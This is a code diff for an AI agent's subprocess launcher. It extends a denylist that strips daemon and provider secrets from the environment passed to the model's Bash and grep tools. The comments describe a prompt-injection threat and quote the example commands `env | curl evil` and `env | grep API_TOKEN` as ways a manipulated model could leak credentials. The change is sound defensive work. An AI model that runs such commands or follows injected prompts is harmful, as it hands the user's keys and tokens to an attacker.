@@ -39,6 +39,7 @@ import {
   formatWriteConfirmation,
 } from './built-in-tools/tool-transforms.js'
 import { TODO_STATUSES, BUILTIN_TOOL_NAMES } from './byok-tools.js'
+import { CHROXY_SECRET_DENYLIST, stripInheritedChroxySecrets } from './utils/spawn-env.js'
 // #4186: SSRF block-list lives in its own module so the (ip, expected)
 // table can grow without bloating this file's WebFetch integration tests.
 // The exported helpers retain the same names as the original locals so
@@ -127,8 +128,19 @@ function globTimeoutMs() {
  * Env vars the model must NEVER see in a Bash subprocess. Centrally
  * the BYOK API key — if a malicious prompt induces the model to run
  * `env | curl evil`, the model exfiltrates the user's API credentials
- * (caught by /agent-review on PR #4060 — see #4069). Plus chroxy's
- * own per-session secrets that are scoped to the WS auth surface.
+ * (caught by /agent-review on PR #4060 — see #4069).
+ *
+ * This is the BYOK PROVIDER'S OWN credential denylist only — the model's own
+ * auth material. Chroxy's daemon-private secrets (the primary API_TOKEN, the
+ * ambiently-inherited CHROXY_PORT/CHROXY_HOOK_SECRET) are a SEPARATE class,
+ * stripped below via the shared `CHROXY_SECRET_DENYLIST` /
+ * `stripInheritedChroxySecrets()` primitives from `utils/spawn-env.js` — see
+ * #8113 (found during #7360/#8111's security review: this function used to
+ * strip only the two keys above, so `env | grep API_TOKEN` inside a BYOK
+ * session's own Bash tool call handed a compromised/malicious model the
+ * daemon's full-authority primary bearer token, plus whatever foreign
+ * session's CHROXY_PORT/CHROXY_HOOK_SECRET the daemon process itself
+ * happened to have ambiently inherited).
  *
  * Note: we do NOT redact every var that looks like a secret (e.g.
  * GITHUB_TOKEN, AWS_*). The user might legitimately need those in
@@ -143,13 +155,31 @@ const SECRET_ENV_DENYLIST = new Set([
 /**
  * Build an env for the Bash/Glob/Grep subprocess that strips chroxy's
  * own secrets. Returns a plain object — pass to executeBash's `env`.
+ *
+ * Three layers, in order:
+ *   1. `SECRET_ENV_DENYLIST` — the BYOK provider's own credential (#4069).
+ *   2. `CHROXY_SECRET_DENYLIST` — daemon-private secrets that must never
+ *      reach ANY spawned child, regardless of provider or mode (#6311):
+ *      the full-authority primary `API_TOKEN`, and `CHROXY_INGEST_SECRET`
+ *      (the `/api/events` / `/api/mailbox` bearer — see
+ *      docs/security/bearer-token-authority.md §6).
+ *   3. `stripInheritedChroxySecrets()` — an AMBIENTLY-inherited
+ *      `CHROXY_PORT`/`CHROXY_HOOK_SECRET` (#7360's class). This BYOK Bash/Grep
+ *      subprocess is not a hook-consuming child at all (BYOK sessions have no
+ *      permission-hook HTTP callback — permissions are gated in-process), so
+ *      there is no "this session's own value" to preserve here; any value
+ *      present is necessarily a foreign session's secret.
+ *
+ * Exported so the strip is directly unit-testable without a real spawn.
  */
-function buildSafeBashEnv() {
+export function buildSafeBashEnv() {
   const out = {}
   for (const [k, v] of Object.entries(process.env)) {
     if (SECRET_ENV_DENYLIST.has(k)) continue
+    if (CHROXY_SECRET_DENYLIST.includes(k)) continue
     out[k] = v
   }
+  stripInheritedChroxySecrets(out)
   return out
 }
 
